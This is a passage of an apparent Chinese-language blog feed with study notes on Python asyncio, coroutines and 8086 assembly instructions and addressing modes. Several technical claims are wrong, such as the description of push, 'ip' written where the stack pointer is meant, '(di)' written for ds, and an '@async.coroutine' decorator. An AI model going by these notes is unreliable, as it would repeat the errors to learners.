class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="meta">@async.coroutine</span></span><br><span class="line"><span class="comment">#async def hello():</span></span><br><span class="line">    print(<span class="string">'Hello world! (%s)'</span> % threading.currentThread())</span><br><span class="line">    <span class="keyword">yield</span> <span class="keyword">from</span> asyncio.sleep(<span class="number">1</span>) <span class="comment">#await asyncio.sleep(1)</span></span><br><span class="line">    print(<span class="string">'Hello again! (%s)'</span> % threading.currentThread())</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">tasks = [hello(), hello()]</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks)) <span class="comment">#run_until_complete在future对象完成后返回，而run_forever在stop前会一直存在。</span></span><br><span class="line">loop.close()</span><br></pre></td></tr></tbody></table></figure><p>输出结果<br></p><figure class="highlight lsl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello world! (<_MainThread(MainThread, started <span class="number">139680001546048</span>)>)</span><br><span class="line">Hello world! (<_MainThread(MainThread, started <span class="number">139680001546048</span>)>)</span><br><span class="line">（暂停约<span class="number">1</span>s）</span><br><span class="line">Hello again! (<_MainThread(MainThread, started <span class="number">139680001546048</span>)>)</span><br><span class="line">Hello again! (<_MainThread(MainThread, started <span class="number">139680001546048</span>)>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>如果将上面的asyncio.sleep()换成真正需要执行的操作，则多个coroutine就可以由1个thread并发执行。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Coroutine runs at'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line">    <span class="keyword">await</span> a()</span><br><span class="line">    <span class="keyword">await</span> b()</span><br><span class="line">    <span class="keyword">await</span> c()</span><br><span class="line">    print(<span class="string">'Coroutine ends at'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'1秒 ->'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    print(<span class="string">'2秒 ->'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)</span><br><span class="line">    print(<span class="string">'3秒 ->'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line"></span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></tbody></table></figure><p>输出结果<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Coroutine</span> <span class="selector-tag">runs</span> <span class="selector-tag">at</span> 17<span class="selector-pseudo">:27</span><span class="selector-pseudo">:24</span></span><br><span class="line">1秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:27</span><span class="selector-pseudo">:25</span></span><br><span class="line">2秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:27</span><span class="selector-pseudo">:27</span></span><br><span class="line">3秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:27</span><span class="selector-pseudo">:30</span></span><br><span class="line"><span class="selector-tag">Coroutine</span> <span class="selector-tag">ends</span> <span class="selector-tag">at</span> 17<span class="selector-pseudo">:27</span><span class="selector-pseudo">:30</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>如果一个对象在await语句中使用，那么它就是<strong>可等待对象</strong>。许多asyncio API都被设计为接受可等待对象。<br>可等待对象有三种主要类型，其中Future可看成是Task的超集：</p><ul><li>coroutine</li><li>task</li><li>future</li></ul><p><code>asyncio.create_task()</code>函数用来并发作为asyncio任务的多个协程，<br>修改上面的例子，让它<strong>单线程并发执行</strong>。我只修改了main函数部分，如下所示。<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">'Coroutine runs!'</span>, time.strftime(<span class="string">'%X'</span>))</span><br><span class="line">    a_task = asyncio.create_task(a())</span><br><span class="line">    b_task = asyncio.create_task(b())</span><br><span class="line">    c_task = asyncio.create_task(c())</span><br><span class="line">    <span class="keyword">await</span> a_task</span><br><span class="line">    <span class="keyword">await</span> b_task</span><br><span class="line">    <span class="keyword">await</span> c_task</span><br><span class="line">    print(<span class="string">'Coroutine ends!'</span>, time.strftime(<span class="string">'%X'</span>))</span><br></pre></td></tr></tbody></table></figure><p></p><p>输出结果<br></p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Coroutine</span> <span class="selector-tag">runs</span> <span class="selector-tag">at</span> 17<span class="selector-pseudo">:53</span><span class="selector-pseudo">:11</span></span><br><span class="line">1秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:53</span><span class="selector-pseudo">:12</span></span><br><span class="line">2秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:53</span><span class="selector-pseudo">:13</span></span><br><span class="line">3秒 <span class="selector-tag">-</span>> 17<span class="selector-pseudo">:53</span><span class="selector-pseudo">:14</span></span><br><span class="line"><span class="selector-tag">Coroutine</span> <span class="selector-tag">ends</span> <span class="selector-tag">at</span> 17<span class="selector-pseudo">:53</span><span class="selector-pseudo">:14</span></span><br></pre></td></tr></tbody></table></figure><p></p><blockquote><p>asyncio.create_task()方法于python3.7添加到标准库中，对于低版本用户，改用低层级函数asyncio.ensure_future()，具体使用上并无二致，仅仅将函数名改一下即可。</p></blockquote><p>再次强调，<strong>asyncio实现的是：单线程、并发执行。</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python从3.4版本开始，引入asyncio标准库；从3.5版本开始，引入async/await语法声明。&lt;br&gt;对于py3，将一个函数升级为协程（或者说“协程函数”）通常有以下两种办法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;asyncio.coroutine装饰器+yield from本地调用&lt;/li&gt;
&lt;li&gt;async关键字+await本地调用（推荐）&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
      <category term="并发编程" scheme="https://celestialcode.xyz/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="异步" scheme="https://celestialcode.xyz/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>协程（一）</title>
    <link href="https://celestialcode.xyz/%E5%8D%8F%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89.html"/>
    <id>https://celestialcode.xyz/协程（一）.html</id>
    <published>2019-04-03T13:46:29.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p>协程是计算机程序的一类组件，推广了协作式多任务的子程序，允许被挂起与被恢复。相对子例程而言，协程更为一般和灵活，但在实践中使用没有子例程那样广泛。<a id="more"></a>协程源自Simula和Modula-2的语言，但也有其它语言支持。协程更适合用来实现彼此熟悉的程序组件，如协作式多任务、异常处理、事件循环、迭代器、无线列表和管道。<br>根据高德纳的说法，马尔文·康威于1958年发明了术语coroutine并用于构建汇编程序，协程最初在1963年被提出。</p><p>下面是一个简单的协程示例（python）<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">>>> </span><span class="function"><span class="keyword">def</span> <span class="title">simple_coroutine</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'-> coroutine started'</span>)</span><br><span class="line"><span class="meta">... </span>    x = <span class="keyword">yield</span></span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'-> coroutine recived'</span>, x)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">>>> </span>my_coro = simple_coroutine()</span><br><span class="line"><span class="meta">>>> </span>my_coro.send(<span class="literal">None</span>)</span><br><span class="line">-> coroutine started</span><br><span class="line"><span class="meta">>>> </span>my_coro.send(<span class="number">422</span>)</span><br><span class="line">-> coroutine recived 422</span><br><span class="line">    ...</span><br><span class="line">  Original exception was:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"<stdin>"</span>, line <span class="number">1</span>, <span class="keyword">in</span> <module></span><br><span class="line">StopIteration</span><br><span class="line">>>></span><br></pre></td></tr></tbody></table></figure><p></p><p>将协程看成是轻量级的线程即可。</p><p><img src="/uploads/协程线程进程.jpg" alt></p><p>印象中，协程总是和“生产者-消费者”模式有关系</p><ul><li>某个模块负责产生数据，这些数据由另外一个模块负责处理</li><li>满足“生产者-缓冲区（缓冲数据）-消费者”的模型</li></ul><p><img src="/uploads/consumerproducer.jpg" alt></p><p>缓冲区的好处在于将生产者和消费者行为解耦合，这是最明显的。通常使用队列queue进行模拟。</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*生产者协程*/</span><br><span class="line">loop</span><br><span class="line">    while q is not full</span><br><span class="line">        create some new items</span><br><span class="line">        add the tiems to q</span><br><span class="line">    yield to consume</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*消费者协程*/</span><br><span class="line">loop</span><br><span class="line">    while q is not empty</span><br><span class="line">        remove some items from q</span><br><span class="line">        use the items</span><br><span class="line">    yield to produce</span><br></pre></td></tr></tbody></table></figure><p><strong>生产者生产产品，如果缓冲区已满，停止生产，生产者协程阻塞。等待消费者消费。</strong><br><strong>消费者消费产品，如果缓冲区已空，停止消费，消费者协程阻塞。等待生产者生产。</strong></p><p>麦当劳的柜台是一个生产者，消费者和产生者可以是一对多、多对一，也可以是多对多的形式。<br>当你正犹豫不觉要点些什么的时候，面前的店员跑去招呼别的客人，这就是协程。<br><img src="/uploads/kfc_.jpg" alt></p><p>下面是一个使用协程的例子</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> consumer():</span><br><span class="line">    global <span class="keyword">count</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">count</span> -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">count</span> = yield <span class="keyword">count</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[Consumer] Number of %d'</span> %<span class="keyword">count</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> producer(c):</span><br><span class="line">    global <span class="keyword">count</span></span><br><span class="line">    <span class="keyword">next</span>(c)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">count</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">count</span> = c.send(<span class="keyword">count</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[Producer] Number of %d'</span> %<span class="keyword">count</span>)</span><br><span class="line"></span><br><span class="line">c = consumer()</span><br><span class="line">producer(c)</span><br></pre></td></tr></tbody></table></figure><p>加上多线程（仅作为演示，想要提高效率我选择多进程），看看效果</p><figure class="highlight gradle"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">count</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> consumer(name):</span><br><span class="line">    global <span class="keyword">count</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">count</span> -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">count</span> = yield <span class="keyword">count</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[Consumer] Number of %d by %s'</span> %(<span class="keyword">count</span>, name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> producer(c):</span><br><span class="line">    global <span class="keyword">count</span></span><br><span class="line">    <span class="keyword">next</span>(c)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">count</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">count</span> = c.send(<span class="keyword">count</span>)</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">'[Producer] Number of %d'</span> %<span class="keyword">count</span>)</span><br><span class="line"></span><br><span class="line">c1 = consumer(<span class="string">'c1'</span>)</span><br><span class="line">c2 = consumer(<span class="string">'c2'</span>)</span><br><span class="line">c3 = consumer(<span class="string">'c3'</span>)</span><br><span class="line"></span><br><span class="line">pt1 = threading.Thread(target=producer, args=(c1,))</span><br><span class="line">pt2 = threading.Thread(target=producer, args=(c2,))</span><br><span class="line">pt3 = threading.Thread(target=producer, args=(c3,))</span><br><span class="line">pt1.start();pt2.start();pt3.start()</span><br></pre></td></tr></tbody></table></figure><p>两次的结果分别如下图所示（左：不加多线程，右：加了多线程）</p><p><img src="/uploads/Screenshot from 2019-04-04 03-29-51.jpg" alt></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;协程是计算机程序的一类组件，推广了协作式多任务的子程序，允许被挂起与被恢复。相对子例程而言，协程更为一般和灵活，但在实践中使用没有子例程那样广泛。&lt;/p&gt;
    
    </summary>
    
      <category term="并发编程" scheme="https://celestialcode.xyz/categories/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="异步" scheme="https://celestialcode.xyz/tags/%E5%BC%82%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>汇编复习（二）</title>
    <link href="https://celestialcode.xyz/%E6%B1%87%E7%BC%96%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89.html"/>
    <id>https://celestialcode.xyz/汇编复习（二）.html</id>
    <published>2019-03-26T14:28:53.000Z</published>
    <updated>2019-05-08T18:36:16.173Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/uploads/gaitubao_680x360_WordItOut-word-cloud-3710871.jpg" alt><br><a id="more"></a></p><h1 id="汇编指令"><a href="#汇编指令" class="headerlink" title="汇编指令"></a>汇编指令</h1><p>汇编指令由两部分组成</p><ul><li>操作码</li><li>操作数</li></ul><p>其中操作码必须有，而操作数可以有一个或两个，也可以没有。<br>零操作数指令或一个的，另外的操作数是隐含的。比如push指令，<br></p><figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push </span><span class="keyword">bx</span><span class="comment">;将栈顶的值推到bx中，栈顶的值就是另一个隐含的操作数</span></span><br></pre></td></tr></tbody></table></figure><p></p><h1 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h1><p>寻址的意思是，寻找操作数所存放的位置（地址）。<br>一共有<strong>7种寻址方式，它们是：</strong></p><ul><li><p>立即数寻址</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="number">10h</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>寄存器寻址</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, <span class="built_in">bx</span></span><br><span class="line"><span class="keyword">inc</span> <span class="built_in">cx</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>存储器寻址（5种）<br>存储器指内存和IO端口。</p></li></ul><ol><li><p>直接寻址<br>操作数在内存中，操作数的偏移地址直接表示在指令中。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, [<span class="number">1064h</span>]  <span class="comment">;默认操作数存放在数据段</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="built_in">es</span>:[<span class="number">1064h</span>]  <span class="comment">;指明段超越ES</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>间接寻址<br>操作数存储在存储器中，操作数的偏移地址在BX、SI、DI和BP的某个寄存器中。<br>若以BX、SI、DI作为间接寻址寄存器，默认操作数存放在数据段中，用DS寄存；<br>若以BP作为间接寻址寄存器，则默认操作数存储在堆栈段，用SS寄存。<br>和直接寻址一样，简介寻址也可以有段超越。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>, [<span class="built_in">si</span>]</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>], <span class="built_in">al</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>相对寻址<br>操作数在存储器中，操作数的有效地址是一个基址寄存器（BX、BP）或变址寄存器（SI、DI）的内容加上指令中给定的8位或16位位移量之和。<br>若以BX、SI、DI作为间接寻址寄存器，默认操作数存放在数据段中，用DS寄存；<br>若以BP作为间接寻址寄存器，则默认操作数存储在堆栈段，用SS寄存。这两点和上面一样。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">cl</span>, [<span class="built_in">bx</span>+<span class="number">1064h</span>]  <span class="comment">;默认数据段</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>基址加变址寻址<br>BX、BP是基址寄存器，DI、SI是变址寄存器。</p><figure class="highlight markdown"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ah, [<span class="string">bp</span>][<span class="symbol">si</span>]  ;不论基址还是变址都是偏移地址，根据基地址寄存器找段寄存器</span><br><span class="line"><span class="code">  ;由bp知，段寄存器是ss，故ah=[ssx10h+bp+si]</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>相对基址加变址寻址<br>在4-基址加变址的基础上，再加上一个偏移量。</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> [<span class="built_in">bx</span>+<span class="built_in">di</span>+<span class="number">1234h</span>], <span class="number">ah</span>  <span class="comment">;[bx+di+1234h]=dsx10h+bx+di+1234h</span></span><br></pre></td></tr></tbody></table></figure></li></ol><h1 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h1><p>一、 通用传送指令</p><ol><li>基本传送指令mov<figure class="highlight armasm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov </span>dst src</span><br></pre></td></tr></tbody></table></figure></li></ol><p>所有传送指令都不影响标志寄存器的标志位。</p><p>mov指令不能实现以下操作：</p><ul><li>存储器和存储器之间不能直接传送，这是错的：<code>mov [1000h], [di]</code></li><li>立即数不能直接送到段寄存器，这是错的：<code>mov ds, 2000h</code></li><li>段寄存器之间不能直接传送，这是错的：<code>mov es, ds</code></li><li>CS不能作为目的操作数，这是错的：<code>mov cs, ax</code></li><li>源操作数和目的操作数的宽度必须相同，这是错的：<code>mov al, 1000h</code></li></ul><ol start="2"><li>堆栈指令push和pop<br>堆栈：<strong>后进先出</strong>（Last In First Out）<br><img src="/uploads/stack_view.jpg" alt="堆栈"></li></ol><p>压栈<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">bx</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>出栈<br></p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pop</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ax</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>堆栈的作用：</p><ul><li>存放寄存器或存储器中暂时不用的数据，需要时可方便的弹出</li><li>调用子程序或发生中断时要保护断点信息，子程序或中断返回时恢复断点信息</li></ul><p>画图时，高地址在下，低地址在上。<br>每次push，ip减少相应长度；每次pop，ip增加相应长度。</p><ol start="3"><li>交换指令xchg<br>数据交换指令是实现两个操作数之间的位置互换的指令，这两个操作数可以是两个寄存器操作数，或一个寄存器操作数与一个存储器操作数，或两个存储器操作数，在多处理机制中，也可以是一个寄存器操作数和一个共享存储器操作数。数据交换指令实现了数据的双向传递，一个数据交换指令起到了三条数据传送指令的作用。</li></ol><p>xchg指令只能发生在以下两种情况</p><ul><li>寄存器和寄存器的xchg</li><li>寄存器和存储器的xchg</li></ul><p>公式<br></p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xchg dst, src  ;<span class="comment">(dst)</span> <-> <span class="comment">(src)</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>存储器之间不能直接交换<br>段寄存器不能作为操作数<br>允许字或字节操作</p><p>二、累加器专用传送指令</p><ol><li><p>输入指令IN<br>用于CPU向从外设备端口接收数据</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, data8  <span class="comment">;从8位端口地址输入一个字节</span></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">ax</span>, data8  <span class="comment">;从8位端口地址输入一个字</span></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">al</span>, <span class="built_in">dx</span>  <span class="comment">;从16位端口地址输入一个字节</span></span><br><span class="line"><span class="keyword">in</span> <span class="built_in">ax</span>, <span class="built_in">dx</span>  <span class="comment">;从16为端口地址输入一个字</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>输出指令OUT<br>用于CPU向外设备端口发送数据</p><figure class="highlight x86asm"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">out</span> data8, <span class="built_in">al</span>  <span class="comment">;向8位地址端口输出一个字节</span></span><br><span class="line"><span class="keyword">out</span> data8, <span class="built_in">ax</span>  <span class="comment">;向8位地址端口输出一个字</span></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">dx</span>, <span class="built_in">al</span>  <span class="comment">;向16位地址端口输出一个字节</span></span><br><span class="line"><span class="keyword">out</span> <span class="built_in">dx</span>, <span class="built_in">ax</span>  <span class="comment">;向16位地址端口输出一个字</span></span><br></pre></td></tr></tbody></table></figure></li></ol><p>三、目的地址传送指令</p><p>8086CPU提供了三条，分别是</p><ul><li>lea（取偏移地址）</li><li>lds（取数据内容）</li><li>les（取数据内容）</li></ul><p>（1）lea（load effective address）<br>功能：将源操作数的偏移地址传送到目的操作数<br></p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea re<span class="name">g16</span>, mem  ;注：re<span class="name">g16</span>指<span class="number">16</span>位通用寄存器，和上面data<span class="number">8</span>一样，都是简写。</span><br></pre></td></tr></tbody></table></figure><p></p><p>设(bx)=0400h，(si)=003ch，<code>lea bx, [bx+si+0f62h]</code><br>执行指令后，源操作数地址为(bx)+(si)+0f62h=0400h+003ch+0f62h=139eh<br>则(bx)=139eh</p><p>（2）lds（load pointer using DS）<br>功能：将源操作数指定的4个相继字节的数据分别传送到指令指定的寄存器和ds中<br></p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lds re<span class="name">g16</span>, mem  ;<span class="comment">(reg16)</span><-<span class="comment">(mem)</span>  <span class="comment">(ds)</span><-<span class="comment">((mem)</span><span class="number">+2</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>如 <code>lds si, [0010h]</code>，设(ds)=0c00h，数据在内存中分布情况如下</p><p>偏移地址    0010h    c0011h    c0012h    c0013h<br>数据内容    80h    01h    00h    20h</p><p>则指令执行后，(si)=0180h，(di)=2000h</p><p>（3）les（load pointer using ES）<br>类比LDS。<br></p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">les re<span class="name">g16</span>, mem  ;<span class="comment">(reg16)</span><-<span class="comment">(mem)</span>  <span class="comment">(es)</span><-<span class="comment">((mem)</span><span class="number">+2</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>LDS和LES分为一类，都是取地址指代的内容；而LEA传送的就是地址。</p><p>四、标志传送指令<br>8086CPU有四条</p><ul><li>lahf</li><li>sahf</li><li>popf</li></ul><p>psw（program status word，程序状态字）是标志寄存器或者说状态寄存器的简写。</p><p>（1）lahf（load AH into flags）<br>功能：(ah)<-(psw的低8字节)</p><p>（2）sahf（store AH into flags）<br>功能：(psw的低8字节)<-(ah)</p><p>（3）popf（pop flags）<br>功能：标志出栈<br>(psw)<-((sp)+1)<br>(sp)<-(sp)+2</p><h1 